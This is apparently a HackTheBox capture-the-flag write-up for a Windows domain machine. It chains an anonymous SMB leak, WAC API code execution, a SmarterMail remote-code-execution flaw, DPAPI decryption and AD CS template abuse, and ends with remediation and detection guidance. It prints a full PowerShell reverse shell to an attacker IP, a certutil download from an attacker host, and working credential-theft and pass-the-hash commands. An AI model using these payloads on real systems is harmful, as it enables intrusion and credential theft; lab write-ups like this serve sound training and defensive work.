# DanglingTree - Enterprise Architecture & AD CS Exploitation

**Platform:** HackTheBox | **Target OS:** Windows | **Difficulty:** Medium
**Focus:** WAC API Exploitation, SmarterMail Unauthenticated RCE (CVE-2026-24423), DPAPI Masterkey Decryption, AD CS Misconfigurations (ESC4 to ESC1)

## 1. Executive Summary & Attack Chain
This assessment highlights a comprehensive attack path traversing from initial external misconfigurations to a full Active Directory forest compromise. The engagement began with unauthenticated SMB access leaking sensitive IT documents, which provided credentials for the Windows Admin Center (WAC). A post-authentication Remote Code Execution (RCE) vulnerability in WAC yielded initial access. Internal reconnaissance identified a vulnerable, locally bound SmarterMail instance (CVE-2026-24423), allowing lateral movement and extraction of encrypted user credentials. 

Subsequent local enumeration exposed stored DPAPI credentials, which were decrypted offline to hijack a higher-privileged domain account. Finally, Active Directory Certificate Services (AD CS) misconfigurations (ESC4) were abused to rewrite a certificate template, forge an Administrator certificate, and achieve Domain Admin privileges.

**Kill-Chain summary:**
1. **Reconnaissance:** Anonymous SMB mapping revealed a PDF containing IT credentials.
2. **Initial Access:** Authenticated interaction with Windows Admin Center (WAC) allowed arbitrary PowerShell execution via the REST API.
3. **Lateral Movement:** Pivoting via `chisel` exposed an internal SmarterMail service. Exploitation of CVE-2026-24423 (Unauthenticated RCE) provided access to local files and DES-encrypted backup passwords.
4. **Privilege Escalation (User):** Decrypting the backup password yielded the `noah.b` account. Enumeration of Windows DPAPI allowed the offline decryption of `alex.o`'s stored domain credentials.
5. **Privilege Escalation (Domain):** BloodHound analysis revealed AD object takeover rights (`ForceChangePassword`) and AD CS Template misconfigurations. Modifying the `EmployeeAuthTemplate` (ESC4) permitted a Subject Alternative Name (SAN) spoofing attack to retrieve the Domain Admin NTLM hash.

---

## 2. Network Reconnaissance & Surface Mapping
The assessment commenced with a standard TCP port scan using Nmap to map the attack surface of the Domain Controller. 

```bash
❯ nmap -sV -sC DanglingTree.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-12 07:58 +0300
Nmap scan report for DanglingTree.htb (10.129.114.32)
Host is up (0.15s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-12 11:58:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Server Message Block (SMB) Enumeration
Recognizing standard Active Directory ports, unauthenticated access to the SMB service was tested. SMB null sessions or misconfigured shares often act as a treasure trove for organizational structure and credential leaks.

```bash
❯ smbclient -L //10.129.114.32 -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
❯ smbclient //10.129.114.32/IT -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 03:05:09 2026
  ..                                  D        0  Sun Apr  5 02:57:30 2026
  Security                            D        0  Sun Apr  5 03:05:20 2026

		7062015 blocks of size 4096. 2285953 blocks available
smb: \> recurce on
recurce: command not found
smb: \> recurse on
smb: \> prompt OFF
smb: \> mget *
getting file \Security\DanglingTree_RoE_Assessment.pdf of size 28905 as Security/DanglingTree_RoE_Assessment.pdf (26.3 KiloBytes/sec) (average 26.3 KiloBytes/sec)
smb: \> exit

░▒▓ 💀 0xZiki   arch     ⏱ 54s
 󰄬 ❯ cd Security && ls
.rw-r--r-- 29k 0xZiki 12 Sep 08:02  DanglingTree_RoE_Assessment.pdf
```
Analyzing the downloaded PDF (`DanglingTree_RoE_Assessment.pdf`) yielded static valid credentials: `anderson.w` / `R3dT3am@Acc3ss#01`.

---

## 3. Initial Access & WAC API Exploitation
An extended high-port scan identified port `6600`, housing **Windows Admin Center (WAC)**. WAC is a browser-based management tool replacing traditional MMC consoles.

```text
6600/tcp open  ssl/mshvlm?
| tls-alpn:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc.danglingtree.htb
```
### Theoretical Vulnerability Mechanics: WAC `invokeCommand` Endpoint
Under the hood, Windows Admin Center heavily relies on PowerShell Remoting (WinRM) to execute administrative tasks via a RESTful API (`WinREST`). The `/api/services/WinREST/PowerShell/nodes/dc/invokeCommand` endpoint is designed to accept JSON-formatted commands and run them in a high-integrity Runspace on the target node. Because there is inadequate input sanitization validating the integrity of the `$script` property, an authenticated user can simply swap the expected administrative script with a malicious payload. 

By intercepting the legitimate administrative connection request through Burp Suite, the `script` parameter was modified to include a standard TCP PowerShell Reverse Shell payload.

```http
POST /api/services/WinREST/PowerShell/nodes/dc/invokeCommand HTTP/2
Host: danglingtree.htb:6600
Cookie: [Truncated]
Content-Type: application/json; charset=UTF-8

{"properties":{"script":"$client = New-Object System.Net.Sockets.TCPClient('10.129.115.193',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS '+ (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","command":"Get-WACSMServerConnectionStatus","module":"Microsoft.SME.ServerManager","state":"ready","useInProcRunspace":false,"invokeMode":"Polling"}}
```

The server dynamically executed the payload within an out-of-process Runspace, granting a reverse shell as `anderson.w`.

```bash
❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.114.32 56525
ls
PS C:\Users\anderson.w\Documents> 
```

---

## 4. Lateral Movement & SmarterMail Exploit (CVE-2026-24423)
Local enumeration of active sockets revealed several internal ports (25, 110, 143, 587, 5222, 17017) bound exclusively to the localhost interface (`127.0.0.1`), effectively hiding them from external scanners.

```powershell
PS C:\Users\anderson.w\Documents> netstat -ano | findstr "LISTEN"
  TCP    127.0.0.1:25           0.0.0.0:0              LISTENING       6480
  TCP    127.0.0.1:17017        0.0.0.0:0              LISTENING       6480
```

To interact with the hidden web application on port `17017`, `chisel` was deployed to create an encapsulated SOCKS/Reverse tunnel over HTTP.

```bash
PS C:\Users\anderson.w\Documents> certutil -urlcache -split -f http://10.10.15.47:9090/chisel.exe C:\Users\anderson.w\Documents\chisel.exe
PS C:\Users\anderson.w\Documents> .\chisel.exe client 10.10.15.47:9001 R:17017:127.0.0.1:17017
```

```bash
❯ chisel server -p 9001 --reverse
2026/09/12 09:13:06 server: Reverse tunnelling enabled
2026/09/12 09:32:14 server: session#26: tun: proxy#R:17017=>17017: Listening
```

Browsing to `http://127.0.0.1:17017` revealed a **SmarterMail** administrative panel. Inspecting the page source exposed the exact build version:
`var stProductBuild = "9504 (Jan 8, 2026)";`

### Theoretical OS Mechanics: SmarterMail CVE-2026-24423
SmarterMail builds prior to 9511 are vulnerable to a critical Unauthenticated Remote Code Execution flaw. The vulnerability resides in the `ConnectToHub` API logic. The endpoint `api/v1/settings/sysadmin/connect-to-hub` fails to properly validate the calling identity and directly trusts configuration structures returned by a remote "Hub" node defined by the attacker. 

When the local SmarterMail instance reaches out to the attacker's simulated Hub server, the Hub responds with a malicious JSON object defining a `SystemMount` path and a `CommandMount` property. The SmarterMail C# backend executes this `CommandMount` string via native OS process instantiation (e.g., `cmd.exe` or `powershell.exe`) in the context of the service account, failing to sanitize the arbitrary input.

A malicious Python Flask server (`hub.py`) was hosted locally, and a crafted POST request triggered the callback.

**Malicious POST Trigger:**
```http
POST /api/v1/settings/sysadmin/connect-to-hub HTTP/1.1
Host: 127.0.0.1:17017
Content-Type: application/json
Content-Length: 100

{
	"hubAddress":"http://10.10.15.47:8081/",
	"oneTimePassword":"test",
	"nodeName":"victim"
}
```

The executed payload granted access to the internal SmarterMail file structure, revealing an encrypted backup password in `settings.json`.

```bash
❯ sudo nc -lnvp 443
Connection received on 10.129.114.32 58372
PS C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings>
```

By extracting `"password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"` and utilizing static SmarterMail Data Encryption Standard (DES) keys mapped by the community, the string was decrypted to: `RiverDragon#Storm25`. 
`RunasCs` was subsequently used to spawn a low-noise shell as `noah.b`, acquiring the first flag.

```markdown
❯ rlwrap nc -lnvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.114.32 58535
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\WINDOWS\system32> whoami
whoami
danglingtree\noah.b
PS C:\WINDOWS\system32> cd ..\..\
cd ..\..\
PS C:\> ls
ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/25/2026  10:40 PM                inetpub
d-----          4/1/2024  12:02 AM                PerfLogs
d-r---         3/25/2026  11:17 PM                Program Files
d-r---         3/25/2026  11:23 PM                Program Files (x86)
d-----          4/4/2026   5:57 PM                Shares
d-----         3/26/2026   1:59 PM                SmarterMail
d-r---         9/12/2026   5:21 AM                Users
d-----          8/4/2026   9:13 PM                Windows


PS C:\> cd Users
cd Users
PS C:\Users> cd noah.b
cd noah.b
PS C:\Users\noah.b> cd Desktop
cd Desktop
PS C:\Users\noah.b\Desktop> ls
ls


    Directory: C:\Users\noah.b\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/12/2026   4:40 AM             34 user.txt


PS C:\Users\noah.b\Desktop> cat user.txt
cat user.txt
bf54aae7ad6638ab0b9e402139c59982
PS C:\Users\noah.b\Desktop>
```

---

## 5. Privilege Escalation & Windows DPAPI Mechanics
Inside `noah.b`'s context, enumeration revealed Active Directory Domain DPAPI files.

### OS Theoretical Mechanics: Windows Data Protection API (DPAPI)
DPAPI is the fundamental cryptography subsystem in Windows designed to protect user-specific sensitive data (e.g., saved browser passwords, network credentials, EFS keys). DPAPI encrypts data using a symmetric Master Key, which is stored in the user's `AppData\Roaming\Microsoft\Protect` directory. This Master Key is itself encrypted using a cryptographic hash (PBKDF2) derived from the user’s logon password. 

By having the plaintext password for `noah.b` and access to their AppData directory, it is possible to extract their DPAPI Master Key, and subsequently decrypt any files (like saved Windows network credentials) they possess.

```powershell
PS C:\Users\noah.b\AppData\Roaming\Microsoft\protect> Get-ChildItem S-1-5-21-4220238332-57023728-1129110646-1602 -Force
-a-hs-         3/26/2026   2:23 PM            876 f53fcaba-f057-48e8-8f92-0180d274bf0f

PS C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials> dir -Force
-a-hs-         3/27/2026   3:03 PM            490 57FFB67D684C67F09E7153B9C7CC3940
```

The files were exported via SMB (`smbserver.py`) and decrypted locally using Impacket. The decrypted credential revealed the password for a new user, `alex.o`.

```bash
░▒▓ 💀 0xZiki   arch     ⏱ 7s
 󰅚 ❯ sudo env "PATH=$PATH" dpapi.py masterkey -file f53fcaba-f057-48e8-8f92-0180d274bf0f -sid S-1-5-21-4220238332-57023728-1129110646-1602 -password 'RiverDragon#Storm25'
Decrypted key: 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8

░▒▓ 💀 0xZiki   arch     ⏱ 0s
 󰄬 ❯ sudo env "PATH=$PATH" dpapi.py credential -file 57FFB67D684C67F09E7153B9C7CC3940 -key '0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8'
Username    : alex.o
Unknown     : SunsetMountainPeak@2025
```

---

## 6. Domain Takeover & AD CS Exploitation (ESC4 -> ESC1)
Running `bloodhound-python` with `alex.o` exposed that `alex.o` (likely through a group) had `ForceChangePassword` rights over another user, `jake.h`. The password was reset using `bloodyAD`.

```bash
❯ bloodyAD -d danglingtree.htb -u 'alex.o' -p 'SunsetMountainPeak@2025' --host 10.129.115.193 set password 'jake.h' 'Password123!'
[+] Password changed successfully!
```

### Theoretical AD CS Mechanics: ESC4 Configuration Rewrite
`jake.h` was found to possess Write DACL (Discretionary Access Control List) permissions over the AD CS certificate template `EmployeeAuthTemplate`. This is classified as an **ESC4** vulnerability.

Because AD CS Templates are simply Active Directory Objects stored within the Configuration partition, a user with Write permissions can modify the template's attributes using LDAP. By changing specific template configurations (e.g., adding `Client Authentication` EKU, disabling Manager Approval, and enabling `ENROLLEE_SUPPLIES_SUBJECT` via the `msPKI-Certificate-Name-Flag`), an attacker can intentionally downgrade the security of the template (converting ESC4 to ESC1).

Python `ldap3` scripts were utilized to rewrite the attributes of `EmployeeAuthTemplate` and alter its ACL to permit enrollment.

```bash
❯ python3 -c 'import struct,ssl;from ldap3 import Server,Connection,ALL,NTLM,Tls;tls=Tls(validate=ssl.CERT_NONE);c=Connection(Server("10.129.115.193",port=636,use_ssl=True,tls=tls,get_info=ALL),user="DANGLINGTREE\jake.h",password="Password123!",authentication=NTLM,auto_bind=True);r=c.add("CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb",attributes={"objectClass":["top","pKICertificateTemplate"],...
[+] Created
```
Once downgraded, `certipy` was used to request a certificate, supplying the `Administrator` account as the Subject Alternative Name (SAN). The certificate was successfully forged, and PKINIT was utilized to retrieve the Domain Administrator NTLM hash.

```bash
❯ certipy req -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.115.193 -ca 'danglingtree-DC-CA' -target '10.129.115.193' -template 'EmployeeAuthTemplate' -upn 'administrator@danglingtree.htb' -sid 'S-1-5-21-4220238332-57023728-1129110646-500' -debug
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@danglingtree.htb'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```

Pass-The-Hash via `psexec.py` provided a high-integrity SYSTEM shell, yielding complete domain compromise.

```bash
❯ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925 administrator@10.129.115.193
C:\Users\Administrator\Desktop> type root.txt
277d3e7420e4d92790fd6e452b6bd180
```

---

## 7. Defensive Remediation & Detection Engineering

### Remediation Strategies
1. **SMB Anonymous Binding:** Disable anonymous access and null sessions on SMB shares. The `IT` share should require authenticated mapping strictly tied to specific administrative groups.
2. **Windows Admin Center (WAC):** Implement stringent Role-Based Access Control (RBAC) on WAC gateways. Restrict `invokeCommand` privileges to authorized administrators only. Ensure logging is enabled for all WinREST PowerShell invocations.
3. **SmarterMail Patching (CVE-2026-24423):** Update SmarterMail to Build 9511 or later. Alternatively, restrict API endpoints connecting outbound (Hub integration) using host-based firewalls.
4. **AD CS Template Hardening (ESC4):** Audit AD CS Template DACLs. Ensure low-privileged users (e.g., `jake.h` or generalized IT groups) do not have `WriteDacl`, `WriteProperty`, or `GenericAll` rights over Certificate Templates. Disable `ENROLLEE_SUPPLIES_SUBJECT` (SAN flag) unless strictly required and coupled with Manager Approval.

### Detection Engineering
* **WinRM / PowerShell Logging:** Monitor `Event ID 4104` (Script Block Logging) and `Event ID 4103` (Module Logging) for suspicious base64 encoded payloads or TCP socket instantiations originating from the WAC executable.
* **Process Creation Anomalies:** Alert on `Event ID 4688` where the SmarterMail process (`mailservice.exe` or similar) spawns command interpreters (`cmd.exe` or `powershell.exe`).
* **DPAPI Abuse:** Monitor `Event ID 4692` (Backup of data protection master key was attempted) or abnormal mass SMB reads to the `\AppData\Roaming\Microsoft\Protect` directories over the network.
* **AD CS Misuse:** Alert on `Event ID 4899` (A Certificate Template was updated). Specifically, monitor for changes to the `msPKI-Certificate-Name-Flag` enabling SANs. Alert on `Event ID 4887` or `4886` if a certificate is requested by one identity (e.g., `jake.h`) but contains a high-privileged SAN (e.g., `Administrator`).

